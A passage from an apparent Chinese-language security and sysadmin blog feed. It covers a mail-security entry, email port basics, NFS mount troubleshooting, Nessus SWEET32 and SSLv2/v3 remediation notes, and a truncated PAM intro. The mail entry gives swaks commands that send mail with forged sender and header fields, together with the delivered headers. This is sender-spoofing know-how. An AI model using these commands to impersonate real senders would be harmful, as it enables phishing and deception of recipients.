class="hljs-operator">&lt;</span>a href<span class="hljs-operator">=</span><span class="hljs-string">&quot;https://sctrack.sendcloud.net/track/unsubscribe.do?p=eyJ1c2VyX2lkIjogMTAxNTAyLCAidGFza19pZCI6ICIiLCAiZW1haWxfaWQiOiAiMTYzNTc2NDYwMzI3OV8xMDE1MDJfNzM4Nl85OTU4LnNjLTEwXzlfMTNfMjEzLWluYm91bmQwJDE0ODIwNTYyNDBAcXEuY29tIiwgInNpZ24iOiAiZTcxM2ZmNTg2ZDIyYTE5NTg5MDJjNTE5YjkwYzQzODEiLCAidXNlcl9oZWFkZXJzIjoge30sICJsYWJlbCI6IDAsICJ0cmFja19kb21haW4iOiAic2N0cmFjay5zZW5kY2xvdWQubmV0IiwgInJlYWxfdHlwZSI6ICIiLCAibmV0ZWFzZSI6ICJmYWxzZSIsICJvdXRfaXAiOiAiMTIwLjEzMi41NS43NCIsICJjb250ZW50X3R5cGUiOiAiMCIsICJyZWNlaXZlciI6ICIxNDgyMDU2MjQwQHFxLmNvbSIsICJtYWlsbGlzdF9pZCI6IDAsICJvdmVyc2VhcyI6ICJmYWxzZSIsICJjYXRlZ29yeV9pZCI6IDIzOTkwNywgInBhZ2VfaWQiOiAtMX0%3D&quot;</span> target<span class="hljs-operator">=</span><span class="hljs-string">&quot;_blank&quot;</span> style<span class="hljs-operator">=</span><span class="hljs-string">&quot;display: table-cell;display:inline-block;background:#ddd; border-radius:4px;padding: 3px 15px;color:#a6a6a6;text-decoration:none;font-size:12px;&quot;</span><span class="hljs-operator">&gt;</span>点击这里取消订阅<span class="hljs-operator">&lt;</span>br <span class="hljs-operator">/</span><span class="hljs-operator">&gt;</span>click to unsubscribe<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>a<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>div<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>td<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>tr<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>table<span class="hljs-operator">&gt;</span><br><span class="hljs-operator">-</span>-<span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">=</span><span class="hljs-number">9079726093015921879</span><span class="hljs-operator">==</span><span class="hljs-operator">-</span>-<br><br><br><br><br></code></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>swaks –header “Subject: vapd10271613” –header-X-Mailer “staff.domain” –header-Message-Id “staff.domain” –to <a href="mailto:&#x6d;&#x61;&#x69;&#x6c;&#x31;&#x40;&#x73;&#116;&#x61;&#102;&#102;&#46;&#x64;&#111;&#109;&#97;&#105;&#x6e;">&#x6d;&#x61;&#x69;&#x6c;&#x31;&#x40;&#x73;&#116;&#x61;&#102;&#102;&#46;&#x64;&#111;&#109;&#97;&#105;&#x6e;</a>,<a href="mailto:&#x6d;&#97;&#x69;&#x6c;&#x32;&#64;&#x73;&#116;&#97;&#102;&#102;&#x2e;&#100;&#111;&#109;&#97;&#105;&#x6e;">&#x6d;&#97;&#x69;&#x6c;&#x32;&#64;&#x73;&#116;&#97;&#102;&#102;&#x2e;&#100;&#111;&#109;&#97;&#105;&#x6e;</a> –from <a href="mailto:&#118;&#97;&#x70;&#x40;&#115;&#x74;&#97;&#x66;&#x66;&#x2e;&#100;&#111;&#x6d;&#x61;&#x69;&#x6e;">&#118;&#97;&#x70;&#x40;&#115;&#x74;&#97;&#x66;&#x66;&#x2e;&#100;&#111;&#x6d;&#x61;&#x69;&#x6e;</a> –ehlo staff.domain –body “2021.1028.1421helloword”</p><p>swaks –header “Subject:test1” –to <a href="mailto:&#x6e;&#99;&#x30;&#105;&#x73;&#x69;&#110;&#105;&#x40;&#102;&#111;&#x78;&#109;&#x61;&#x69;&#x6c;&#46;&#x63;&#x6f;&#109;">&#x6e;&#99;&#x30;&#105;&#x73;&#x69;&#110;&#105;&#x40;&#102;&#111;&#x78;&#109;&#x61;&#x69;&#x6c;&#46;&#x63;&#x6f;&#109;</a> –from <a href="mailto:&#104;&#97;&#x77;&#x6b;&#x30;&#x40;&#x76;&#105;&#x63;&#x74;&#x2e;&#115;&#x69;&#116;&#x65;">&#104;&#97;&#x77;&#x6b;&#x30;&#x40;&#x76;&#105;&#x63;&#x74;&#x2e;&#115;&#x69;&#116;&#x65;</a> –header-X-Mailer “vict.site”</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Received</span>: from localhost.localdomain ([<span class="hljs-number">114.132.246.141</span>])<br><span class="hljs-attribute">by</span> newxmmxsza90.qq.com (NewMX) with SMTP id <span class="hljs-number">70</span>C31E34<br><span class="hljs-attribute">for</span> &lt;nc0isini@foxmail.com&gt;; Tue, <span class="hljs-number">02</span> Nov <span class="hljs-number">2021</span> <span class="hljs-number">20</span>:<span class="hljs-number">28</span>:<span class="hljs-number">12</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">X</span>-QQ-mid: xmmxsza90t1635856092tx091has2<br><span class="hljs-attribute">X</span>-QQ-XMAILINFO: MjtcwOZJa0njs2uRVUuJXHvZ2PknYPWArBD3CyVj9A4cHs7JvBZnQH/hKdIeB1<br> <span class="hljs-attribute">hALD6NnCa6Ssa1H9ZqRKVPIckkKzu4uzKY</span>/FbhJ7v7UwUyKs4RO1uhoT0lLKY9qpsRnLYQIljkC0<br> <span class="hljs-attribute">wsiOSlJIEwJ9VHGogTKBLOTA4y8PrF3eVAowQyrJd9trwsfBzbIJfbp7MXKSu064mG0TJCOQOwCl</span><br> <span class="hljs-attribute">dsyBj01rjnZhJU</span>/PNbogZYxRvdCvKw0Njxzu9U+H5HWzkp13wrUacPPqojN8JXvoY3bKR9xq5EXc<br> <span class="hljs-attribute">CkL</span>/a4ldNIM32edwRqnPeDvIx+fVZDIJ6ojgDhyWbNEl8ix8DBVcnmBd5sWSYcWO48uggTG0rvFO<br> <span class="hljs-attribute">4aW</span>+<span class="hljs-number">9</span>wYE80kIpbNSPfb32Ufzc0Bd/CiKAs3erc1d+gSBFs/wYpmhTarrZ+Gq8MWzGNdAj6phj3G/<br> <span class="hljs-attribute">DH91gW</span>//Af43ioJgrR7hM0xwlleI5RShYvwCl0h4NXm9SfWgzf0BEYy6HHW/xhAImxBEca7r3hOa<br> <span class="hljs-attribute">1TBAo9VvnCf8</span>+nmN5VAVae/tdnDiqTtwTtBb6HLj2h76CbvwTh0Tt3j22SPTfPwh5BPJ7mldOIwt<br> <span class="hljs-attribute">8R</span>+<span class="hljs-number">0</span>TUunNW6vX7ixNg9AHvV6vPrrO0UBSO5psBV/U22AF7Lmp6yfxhCnwRbkyoTDuy70cBJ38rHY<br> <span class="hljs-attribute">JDXqu08XbfSiQ9w</span>+uelYsd5C6acz2auVDr8/j63JCs5qDpSgcHdTxL0xZFKjEp1ogZd77pP1FiB6<br> <span class="hljs-attribute">olVRj1zKeg0VYdahstB1</span>+AfgshNzSL8hdA<br><span class="hljs-attribute">Date</span>: Tue, <span class="hljs-number">02</span> Nov <span class="hljs-number">2021</span> <span class="hljs-number">20</span>:<span class="hljs-number">28</span>:<span class="hljs-number">12</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">To</span>: nc0isini@foxmail.com<br><span class="hljs-attribute">From</span>: hawk0@vict.site<br><span class="hljs-attribute">Subject</span>:test1<br><span class="hljs-attribute">Message</span>-Id: &lt;<span class="hljs-number">20211102202812</span>.<span class="hljs-number">1761846</span>@localhost.localdomain&gt;<br><span class="hljs-attribute">X</span>-Mailer: vict.site<br><br><span class="hljs-attribute">This</span> is a test mailing<br></code></pre></td></tr></table></figure><p>swaks –header “Subject:test1” –to <a href="mailto:&#110;&#x63;&#x30;&#105;&#x73;&#105;&#x6e;&#x69;&#64;&#102;&#x6f;&#x78;&#109;&#x61;&#x69;&#108;&#x2e;&#99;&#x6f;&#x6d;">&#110;&#x63;&#x30;&#105;&#x73;&#105;&#x6e;&#x69;&#64;&#102;&#x6f;&#x78;&#109;&#x61;&#x69;&#108;&#x2e;&#99;&#x6f;&#x6d;</a> –from <a href="mailto:&#x68;&#97;&#x77;&#x6b;&#48;&#x40;&#x76;&#x69;&#x63;&#116;&#x2e;&#115;&#x69;&#x74;&#x65;">&#x68;&#97;&#x77;&#x6b;&#48;&#x40;&#x76;&#x69;&#x63;&#116;&#x2e;&#115;&#x69;&#x74;&#x65;</a></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Received:</span> from localhost.localdomain ([<span class="hljs-number">114.132</span>.<span class="hljs-number">246.141</span>])<br>by newxmmxszc77.qq.com (NewMX) <span class="hljs-keyword">with</span> SMTP id <span class="hljs-number">63</span>B9BAA0<br>for <span class="hljs-operator">&lt;</span>nc0isini@foxmail.com<span class="hljs-operator">&gt;</span>; Tue, <span class="hljs-number">02</span> Nov <span class="hljs-number">2021</span> <span class="hljs-number">20</span>:<span class="hljs-number">24</span>:<span class="hljs-number">59</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span><br><span class="hljs-params">X-QQ-mid:</span> xmmxszc77t1635855899t7bp0g5xq<br><span class="hljs-params">X-QQ-XMAILINFO:</span> MSstRF5C1p<span class="hljs-symbol">/jvJQ7kmkfTyc2EJJ9X6ZkP4+bxJ4Dj/ED4g9FYbGeb/YiyAFbU9</span><br> IX<span class="hljs-symbol">/vq43cBNmqRVvdjGOYKoNy3Fu80/zPjkx+vD83dby91KPYANKnAlINj/74SA1FxANtG9zIhJ/C</span><br> Rcg5cGBd2RsuLrooKppy<span class="hljs-symbol">/IgBKCdF4bH0aNLLIr3KGZ8oTZDf/agRi1fDITpMyqCYEWMyoLXMsi6N</span><br> szeCp88mzW8yEG80s1qNPjSGEyS5nV87hE9zgoqBrY9BIpwgNFauvB2L0NExL<span class="hljs-symbol">/llhTrK4oSkHwGg</span><br> EhkmCtClZrQt3<span class="hljs-symbol">/4rLqLZoxPyrS+LkZFagabNO/L6VkJtNsdfFQ8msOnkVYDSsrzM0Q9UGwMURN/2</span><br> <span class="hljs-number">4</span>dpNl5T<span class="hljs-symbol">/07O1WV6qm9TU/flYi1uLTYqWU06ceVniiQ4dJdMo8v1lz309jAtNwMVFxVqhIxnm3vVd</span><br> <span class="hljs-number">6</span>zePbC<span class="hljs-symbol">/4DRoNc5eccbT404Y70r9nLWDmMgq342jWEBU9ta3kkx+ZbXysr/LqHVWl+Hm08qlNgAGL</span><br> kMc0AMQbHa5Ea6kjP04Pzl<span class="hljs-symbol">/KU3Yn7nae/IID8Cd8Xeta/M4qdsomKq8hNQhWMIPmOLkU3E9wuwaj</span><br> t0bFCf4dnO4DcTeJQv3QZVWcCSGkqzbjcrIannBPWDTLOu<span class="hljs-operator">+</span>rO9WCYo817bSYntFqlWflCR15mXog<br> <span class="hljs-operator">/</span>jhK5oaZ0a5uaCO6HA00YZP8CfKv6pXDYM6lzD6tkZZVI4YC<span class="hljs-operator">+</span>A<span class="hljs-operator">/</span><span class="hljs-number">5</span>AQ3OK71X1bmdBaZw<span class="hljs-operator">==</span><br><span class="hljs-params">Date:</span> Tue, <span class="hljs-number">02</span> Nov <span class="hljs-number">2021</span> <span class="hljs-number">20</span>:<span class="hljs-number">24</span>:<span class="hljs-number">59</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span><br><span class="hljs-params">To:</span> nc0isini@foxmail.com<br><span class="hljs-params">From:</span> hawk0@vict.site<br>Subject:test1<br><span class="hljs-params">Message-Id:</span> <span class="hljs-operator">&lt;</span><span class="hljs-number">20211102202459.1761162</span>@localhost.localdomain<span class="hljs-operator">&gt;</span><br><span class="hljs-params">X-Mailer:</span> swaks v20190914.<span class="hljs-number">0</span> jetmore.org<span class="hljs-operator">/</span>john<span class="hljs-operator">/</span>code<span class="hljs-operator">/</span>swaks<span class="hljs-symbol">/</span><br><br>This is a test mailing<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>mailsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>mailsec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mail_base</title>
    <link href="/2024/05/16/security/itsec/mailsec/mail_base/"/>
    <url>/2024/05/16/security/itsec/mailsec/mail_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><h3 id="SMTP常见端口"><a href="#SMTP常见端口" class="headerlink" title="SMTP常见端口"></a>SMTP常见端口</h3><p>TCP 25端口</p><p>TCP 587端口，加密端口，STARTTLS协议，属于TLS通讯协议，在STARTTLS命令执行后对原文加密</p><p>TCP 465端口，加密端口，SMTPS（SMTP-over-SSL）</p><h3 id="POP3常见端口"><a href="#POP3常见端口" class="headerlink" title="POP3常见端口"></a>POP3常见端口</h3><p>TCP 110端口</p><p>TCP 995端口</p><h3 id="EXCHANGE常见端口"><a href="#EXCHANGE常见端口" class="headerlink" title="EXCHANGE常见端口"></a>EXCHANGE常见端口</h3><p>TCP 587端口</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>mailsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>mailsec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mount</title>
    <link href="/2024/05/13/yunwei/yunweicommands/Linuxcommands/mount/"/>
    <url>/2024/05/13/yunwei/yunweicommands/Linuxcommands/mount/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>mount -t nfs -o vers&#x3D;3,timeo&#x3D;600,nolock,rsize&#x3D;1048576,wsize&#x3D;1048576,hard,retrans&#x3D;3,noresvport,async,noatime,nodiratime scan.security.nfs.cu-beijing-1-a.nas.aa.bb.com.cn:&#x2F;share .&#x2F;sfs</p><h4 id="t-fstype"><a href="#t-fstype" class="headerlink" title="-t fstype"></a>-t fstype</h4><p>指定文件系统类型</p><p>支持的文件系统类型可以查看 &#x2F;proc&#x2F;filesystems或 &#x2F;lib&#x2F;modules&#x2F;$(uname -r)&#x2F;kernel&#x2F;fs</p><p><strong>cat &#x2F;proc&#x2F;filesystems</strong></p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tcl">[root@nvm- data0]# cat /<span class="hljs-keyword">proc</span>/filesystems<span class="hljs-title"></span><br><span class="hljs-title">nodev</span>sysfs<span class="hljs-title"></span><br><span class="hljs-title">nodev</span>tmpfs<span class="hljs-title"></span><br><span class="hljs-title">nodev</span>bdev<span class="hljs-title"></span><br><span class="hljs-title">nodev</span><span class="hljs-keyword">proc</span><span class="hljs-title"></span><br><span class="hljs-title">nodev</span>cgroup<span class="hljs-title"></span><br><span class="hljs-title">nodev</span>cgroup2<br></code></pre></td></tr></table></figure><p><strong>ls &#x2F;lib&#x2F;modules&#x2F;$(uname -r)&#x2F;kernel&#x2F;fs</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">[root@nvm- data0]<span class="hljs-comment"># ls /lib/modules/$(uname -r)/kernel/fs</span><br>afs                <span class="hljs-keyword">cachefiles </span> cifs  exfat  fat      fuse  isofs  lockd          netfs  nfs_common  nls        pstore        squashfs  xfs<br><span class="hljs-keyword">binfmt_misc.ko.xz </span> ceph        dlm   <span class="hljs-keyword">ext4 </span>  fscache  gfs2  <span class="hljs-keyword">jbd2 </span>  mbcache.ko.xz  nfs    nfsd        overlayfs  smbfs_common  udf<br></code></pre></td></tr></table></figure><h4 id="o，–options-opts"><a href="#o，–options-opts" class="headerlink" title="-o，–options opts"></a>-o，–options opts</h4><p>指定特殊的选项</p><h5 id="async"><a href="#async" class="headerlink" title="async"></a>async</h5><p>I&#x2F;O 异步传输</p><h5 id="atime"><a href="#atime" class="headerlink" title="atime"></a>atime</h5><p>不使用noatime特性，因此inode访问时间由内核默认值控制</p><h5 id="noatime"><a href="#noatime" class="headerlink" title="noatime"></a>noatime</h5><p>不更新文件访问时间（access time）</p><h5 id="nodiratime"><a href="#nodiratime" class="headerlink" title="nodiratime"></a>nodiratime</h5><p>不更新目录访问时间（access time）</p><h5 id="diratime"><a href="#diratime" class="headerlink" title="diratime"></a>diratime</h5><p>更新目录访问时间，默认配置，如果设置noatime，该配置忽略</p><h5 id="nolock"><a href="#nolock" class="headerlink" title="nolock"></a>nolock</h5><h5 id="noresvport"><a href="#noresvport" class="headerlink" title="noresvport"></a>noresvport</h5><h5 id="vers"><a href="#vers" class="headerlink" title="vers"></a>vers</h5><h5 id="timeo"><a href="#timeo" class="headerlink" title="timeo"></a>timeo</h5><h5 id="rsize"><a href="#rsize" class="headerlink" title="rsize"></a>rsize</h5><p>设置读缓冲区字节大小</p><p>rsize&#x3D;1048576</p><h5 id="wsize"><a href="#wsize" class="headerlink" title="wsize"></a>wsize</h5><p>设置写缓冲区字节大小</p><p>wsize&#x3D;1048576</p><h5 id="hard"><a href="#hard" class="headerlink" title="hard"></a>hard</h5><h5 id="retrans"><a href="#retrans" class="headerlink" title="retrans"></a>retrans</h5><h2 id="error"><a href="#error" class="headerlink" title="error"></a>error</h2><h3 id="nfs缺少帮助程序"><a href="#nfs缺少帮助程序" class="headerlink" title="nfs缺少帮助程序"></a>nfs缺少帮助程序</h3><h4 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h4><p>mount -t nfs -o async,noatime,nodiratime scan.nas.baidu.com:&#x2F;share .&#x2F;sfs</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount: /data0/sfs: bad option; <span class="hljs-keyword">for</span> several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.&lt;<span class="hljs-built_in">type</span>&gt; helper program.<br></code></pre></td></tr></table></figure><h4 id="排查过程"><a href="#排查过程" class="headerlink" title="排查过程"></a>排查过程</h4><p>根据错误提示可知，缺乏&#x2F;sbin&#x2F;mount.nfs程序</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">root@nvm- data0</span>]<span class="hljs-meta"># /sbin/mount.nfs</span><br>bash: /sbin/mount.nfs: No such <span class="hljs-keyword">file</span> <span class="hljs-keyword">or</span> directory<br></code></pre></td></tr></table></figure><p>在其他服务器上查看存在该程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost /]# <span class="hljs-built_in">ls</span> /sbin/mount.nfs<br>/sbin/mount.nfs<br></code></pre></td></tr></table></figure><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@nvm- data0]# yum list | grep nfs<br>centos-release-nfs-ganesha4.noarch                   1.0<span class="hljs-string">-2</span>.el9                           extras<br>libnfsidmap.i686                                     1:2.5.4<span class="hljs-string">-25</span>.el9                      baseos<br>libnfsidmap.x86_64                                   1:2.5.4<span class="hljs-string">-25</span>.el9                      baseos<br>libstoragemgmt-nfs-plugin.x86_64                     1.9.7<span class="hljs-string">-2</span>.el9                         appstream<br>nfs-utils.x86_64                                     1:2.5.4<span class="hljs-string">-25</span>.el9                      baseos<br>nfs-utils-coreos.x86_64                              1:2.5.4<span class="hljs-string">-25</span>.el9                      appstream<br>nfs4-acl-tools.x86_64                                0.4.2<span class="hljs-string">-3</span>.el9                         baseos<br>nfsv4-client-utils.x86_64                            1:2.5.4<span class="hljs-string">-25</span>.el9                      appstream<br>pcp-pmda-nfsclient.x86_64                            6.2.0<span class="hljs-string">-2</span>.el9_4                       appstream<br>sssd-nfs-idmap.x86_64                                2.9.4<span class="hljs-string">-6</span>.el9_4                       baseos<br>texlive-mfnfss.noarch                                9:20200406<span class="hljs-string">-26</span>.el9_2                 appstream<br>texlive-psnfss.noarch                                9:20200406<span class="hljs-string">-26</span>.el9_2                 appstream<br></code></pre></td></tr></table></figure><p>解决方案</p><p>sudo yum install nfs-utils  </p><p>sudo dnf install nfs-utils</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@nvm- data0]# <span class="hljs-built_in">ls</span> /sbin/mount.nfs<br>/sbin/mount.nfs<br></code></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mount</span> -t nfs -o vers=<span class="hljs-number">3</span>,timeo=<span class="hljs-number">600</span>,nolock,rsize=<span class="hljs-number">1048576</span>,wsize=<span class="hljs-number">1048576</span>,hard,retrans=<span class="hljs-number">3</span>,noresvport,async,noatime,nodiratime nfs.domain:/share ./sfs<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nessus-中危-SSL 64-bit Block Size Cipher Suites Supported (SWEET32)</title>
    <link href="/2024/05/07/security/osSec/nessus-%E4%B8%AD%E5%8D%B1-SSL%2064-bit%20Block%20Size%20Cipher%20Suites%20Supported%20(SWEET32)/"/>
    <url>/2024/05/07/security/osSec/nessus-%E4%B8%AD%E5%8D%B1-SSL%2064-bit%20Block%20Size%20Cipher%20Suites%20Supported%20(SWEET32)/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="漏洞标题"><a href="#漏洞标题" class="headerlink" title="漏洞标题"></a>漏洞标题</h2><p>SSL 64-bit Block Size Cipher Suites Supported (SWEET32)</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>The remote host supports the use of a block cipher with 64-bit blocks in one or more cipher suites. It is, therefore, affected by a vulnerability, known as SWEET32, due to the use of weak 64-bit block ciphers. A man-in-the-middle attacker who has sufficient resources can exploit this vulnerability, via a ‘birthday’ attack, to detect a collision that leaks the XOR between the fixed secret and a known plaintext, allowing the disclosure of the secret text, such as secure HTTPS cookies, and possibly resulting in the hijacking of an authenticated session.</p><p>Proof-of-concepts have shown that attackers can recover authentication cookies from an HTTPS session in as little as 30 hours.</p><p>Note that the ability to send a large number of requests over the same TLS connection between the client and server is an important requirement for carrying out this attack. If the number of requests allowed for a single connection were limited, this would mitigate the vulnerability. This plugin requires report paranoia as Nessus has not checked for such a mitigation.</p><p>远程主机支持在一个或多个密码套件中使用64位分组密码。因此，由于使用了较弱的64位分组密码，它会受到名为SWEET32的漏洞的影响。有足够资源的中间人攻击者可以利用这个漏洞，通过“birthday”攻击来检测固定密钥和已知明文之间的异或冲突，从而允许密钥文本（如安全的HTTPS cookie）泄露，并可能导致对已认证会话的劫持。</p><p>概念验证表明，攻击者可以在30小时内从HTTPS会话中恢复身份验证cookie。</p><p>请注意，通过客户端和服务器之间的同一个TLS连接发送大量请求的能力是实施这种攻击的一个重要要求。如果限制单个连接允许的请求数量，则可以减轻该漏洞。这个插件需要报告偏执狂，因为Nessus没有检查这样的缓解。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>Reconfigure the affected application, if possible, to avoid use of all 64-bit block ciphers. Alternatively, place limitations on the number of requests that are allowed to be processed over the same TLS connection to mitigate this vulnerability.</p><p>如果可能，请重新配置受影响的应用程序，以避免使用所有64位分组密码。或者，对同一个TLS连接上允许处理的请求数量进行限制，以缓解此漏洞。</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>osSec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>osSec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nessus-严重-SSL Version 2 and 3 Protocol Detection</title>
    <link href="/2024/05/07/security/osSec/nessus-%E4%B8%A5%E9%87%8D-SSL%20Version%202%20and%203%20Protocol%20Detection/"/>
    <url>/2024/05/07/security/osSec/nessus-%E4%B8%A5%E9%87%8D-SSL%20Version%202%20and%203%20Protocol%20Detection/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="漏洞标题"><a href="#漏洞标题" class="headerlink" title="漏洞标题"></a>漏洞标题</h2><p>SSL Version 2 and  3 Protocol Detection</p><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>The  remote service accepts connections encrypted using SSL 2.0 and&#x2F;or     SSL 3.0. These versions of SSL are affected by several cryptographic     flaws, including:           - An insecure padding scheme with  CBC ciphers.           - Insecure session renegotiation  and resumption schemes.          An attacker can exploit these flaws to conduct man-in-the-middle     attacks or to decrypt communications between the affected service and     clients.          Although SSL&#x2F;TLS has a secure means for choosing the highest  supported     version of the protocol (so that these versions will be used only if     the client or server support nothing better), many web browsers     implement this in an unsafe way that allows an attacker to downgrade     a connection (such as in POODLE). Therefore, it is recommended that     these protocols be disabled entirely.          NIST has determined that SSL 3.0 is no longer acceptable for secure     communications. As of the date of enforcement found in PCI DSS v3.1,     any version of SSL will not meet the PCI SSC’s definition of ‘strong     cryptography’.</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>Consult  the application’s documentation to disable SSL 2.0 and 3.0.     Use TLS 1.2 (with approved cipher suites) or higher instead.</p><p>修改配置文件，禁用SSL2.0和SSL3.0，使用TLS1.2或更高的版本</p><p>修改完成后需要重启服务使生效</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>osSec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>osSec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux_pam_auth</title>
    <link href="/2024/05/07/security/osSec/linux_pam_auth/"/>
    <url>/2024/05/07/security/osSec/linux_pam_auth/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="PAM简介"><a href="#PAM简介" class="headerlink" title="PAM简介"></a>PAM简介</h1><p>Pluggable Authentication Modules 可插拔式认证模块</p><p>提供对所有服务进行认证的中央机制</p><p>适用于：login、远程登录（telnet、login、fsh、ftp、ppp）、su等应用程序</p><p>由于是PAM为嵌入式，因此修改配置后会立刻生效</p><h1 id="认证原理"><a href="#认证原理" class="headerlink" title="认证原理"></a>认证原理</h1><p>认证顺序为 Service（服务）-&gt; PAM（配置文件）-&gt; 认证文件</p><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>目录：&#x2F;etc&#x2F;pam.d&#x2F;，可以通过配置文件来确认支持PAM认证的程序</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stata">[root@iZbp1191gh7vw52537lyxrZ pam.<span class="hljs-keyword">d</span>]# <span class="hljs-keyword">ls</span> /etc/pam.<span class="hljs-keyword">d</span>/<br>atd                  login             postlogin-<span class="hljs-keyword">ac</span>       smtp.postfix          system-auth<br>chfn                 other             remote             sshd                  system-auth-<span class="hljs-keyword">ac</span><br>chsh                 passwd            runuser            <span class="hljs-keyword">su</span>                    systemd-user<br>config-util          password-auth     runuser-<span class="hljs-keyword">l</span>          subscription-manager  vlock<br>crond                password-auth-<span class="hljs-keyword">ac</span>  smartcard-auth     sudo<br>fingerprint-auth     polkit-1          smartcard-auth-<span class="hljs-keyword">ac</span>  sudo-i<br>fingerprint-auth-<span class="hljs-keyword">ac</span>  postlogin         smtp               <span class="hljs-keyword">su</span>-<span 